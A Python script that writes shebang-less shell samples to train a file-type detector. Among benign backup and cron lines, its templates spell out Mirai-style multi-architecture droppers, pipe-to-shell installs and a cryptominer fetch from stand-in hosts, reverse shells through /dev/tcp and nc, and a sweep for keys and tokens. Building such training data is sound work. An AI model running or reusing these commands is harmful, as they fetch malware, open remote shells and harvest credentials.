#!/usr/bin/env python3
"""Generate shebang-less Shell training samples to cover the corpus gap that
caused IoT/Mirai-style command lists to misdetect as Turtle. The existing
18 Shell samples almost all start with #!/bin/bash|sh|zsh — the centroid is
biased toward shebang-headed structured scripts, so raw shell command lists
without a shebang don't align well.
"""
import os
import random
import string

ROOT = "/Users/dazhi/projects/filetyping/whatis/samples/Shell"


def rid(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def rand_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


C2_HOSTS = [
    "pen.example.su", "drop.example.io", "stage.example.cc",
    "cdn.example.net", "ops.example.org", "load.example.tld",
]
ARCHES = ["arm", "arm5", "arm6", "arm7", "mips", "mipsel", "x86", "x86_64", "sparc", "sh4", "ppc"]


# 1. IoT/Mirai-style multi-arch dropper
def gen_mirai():
    host = random.choice(C2_HOSTS)
    n = random.randint(4, 11)
    arches = random.sample(ARCHES, n)
    payload = random.choice(["mutil", "bot", "loader", "hex"])
    lines = []
    for arch in arches:
        bin_name = f"{arch}.nn"
        lines.append(
            f"wget http://{host}/{bin_name}; chmod +x {bin_name}; ./{bin_name} {payload}.{arch}"
        )
    body = "\n".join(lines) + "\n"
    # Many real samples are duplicated (we saw this in test data) — sometimes repeat
    if random.random() < 0.5:
        body = body + body
    return body


# 2. Pipe-to-shell install one-liner
def gen_pipe_install():
    host = random.choice(C2_HOSTS)
    tool = random.choice(["curl -fsSL", "wget -qO-", "curl -s", "wget -O -"])
    return f"{tool} https://{host}/install.sh | sh\n"


# 3. Multi-line update/install
def gen_apt_setup():
    return (
        "apt-get update -y\n"
        "apt-get install -y wget curl python3 build-essential\n"
        f"useradd -m -s /bin/bash {rid(6)}\n"
        f"echo '{rid(8)}:{rid(12)}' | chpasswd\n"
        f"mkdir -p /opt/{rid(6)}\n"
        f"cd /opt/{rid(6)} && wget -q http://{random.choice(C2_HOSTS)}/payload.tar.gz\n"
        "tar xzf payload.tar.gz\n"
        f"./setup.sh --install\n"
    )


# 4. Reverse shell one-liner
def gen_reverse_shell():
    ip = rand_ip()
    port = random.randint(1024, 65535)
    style = random.choice([
        f"bash -i >& /dev/tcp/{ip}/{port} 0>&1\n",
        f"sh -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5\n",
        f"exec 3<>/dev/tcp/{ip}/{port}; cat <&3 | while read line; do $line 2>&3 >&3; done\n",
        f"nc -e /bin/sh {ip} {port}\n",
    ])
    return style


# 5. Tar extract + make chain
def gen_tar_make_chain():
    tarball = rid(8) + ".tar.gz"
    dirn = rid(6)
    return (
        f"cd /tmp && wget -q https://{random.choice(C2_HOSTS)}/{tarball}\n"
        f"tar xzf {tarball}\n"
        f"cd {dirn} || exit 1\n"
        f"./configure --prefix=/usr/local && make && make install\n"
        f"cd .. && rm -rf {dirn} {tarball}\n"
    )


# 6. Cron-style command list (no shebang, no quoting)
def gen_cron_commands():
    actions = [
        f"find /var/log -name '*.log' -mtime +7 -delete",
        f"docker system prune -f",
        f"systemctl restart {random.choice(['nginx', 'apache2', 'sshd', 'postgresql'])}",
        f"chown -R {rid(5)}:{rid(5)} /var/www",
        f"du -sh /home/*/Downloads | sort -h",
        f"rsync -avz /backup/ user@{rand_ip()}:/remote-backup/",
    ]
    return "\n".join(random.sample(actions, k=random.randint(3, 5))) + "\n"


# 7. Crypto miner dropper
def gen_miner_drop():
    host = random.choice(C2_HOSTS)
    return (
        f"cd /tmp\n"
        f"wget -q http://{host}/x.tar.gz -O x.tar.gz\n"
        f"tar xzf x.tar.gz && rm -f x.tar.gz\n"
        f"cd x && chmod +x ./xmrig\n"
        f"nohup ./xmrig -o pool.{host}:3333 -u {rid(40)} -p x --donate-level=1 > /dev/null 2>&1 &\n"
        f"echo $! > /tmp/.x.pid\n"
    )


# 8. Find/grep oneliner pipeline
def gen_find_pipeline():
    return (
        f"find / -type f -name '*.{random.choice(['conf', 'env', 'key', 'pem', 'sql'])}' 2>/dev/null | \\\n"
        f"  xargs grep -l '{random.choice(['password', 'secret', 'api_key', 'token', 'BEGIN PRIVATE'])}' 2>/dev/null | \\\n"
        f"  head -{random.randint(5, 50)}\n"
    )


# 9. Multi-command service install
def gen_service_install():
    name = rid(6)
    return (
        f"cp /tmp/{name} /usr/local/bin/{name}\n"
        f"chmod +x /usr/local/bin/{name}\n"
        f"cat > /etc/systemd/system/{name}.service <<EOF\n"
        f"[Unit]\n"
        f"Description={name} service\n"
        f"After=network.target\n"
        f"[Service]\n"
        f"ExecStart=/usr/local/bin/{name}\n"
        f"Restart=always\n"
        f"[Install]\n"
        f"WantedBy=multi-user.target\n"
        f"EOF\n"
        f"systemctl daemon-reload\n"
        f"systemctl enable --now {name}\n"
    )


# 10. Backup rotation script (no shebang)
def gen_backup_rotation():
    return (
        f"DATE=$(date +%Y%m%d)\n"
        f"SRC=/var/www\n"
        f"DST=/backup/snapshot-$DATE\n"
        f"mkdir -p $DST\n"
        f"rsync -a --delete $SRC/ $DST/\n"
        f"find /backup -maxdepth 1 -name 'snapshot-*' -mtime +{random.randint(7, 60)} -exec rm -rf {{}} +\n"
        f"echo \"backup done at $(date)\" >> /var/log/backup.log\n"
    )


GENERATORS = [
    gen_mirai, gen_pipe_install, gen_apt_setup, gen_reverse_shell,
    gen_tar_make_chain, gen_cron_commands, gen_miner_drop,
    gen_find_pipeline, gen_service_install, gen_backup_rotation,
]


def main():
    for i in range(10):
        random.seed(12000 + i)
        gen = GENERATORS[i % len(GENERATORS)]
        body = gen()
        name = f"noshebang_{gen.__name__.replace('gen_', '')}_{i}.sh"
        p = os.path.join(ROOT, name)
        with open(p, "w") as f:
            f.write(body)
        print(f"wrote {p} ({os.path.getsize(p)} bytes)")


if __name__ == "__main__":
    main()
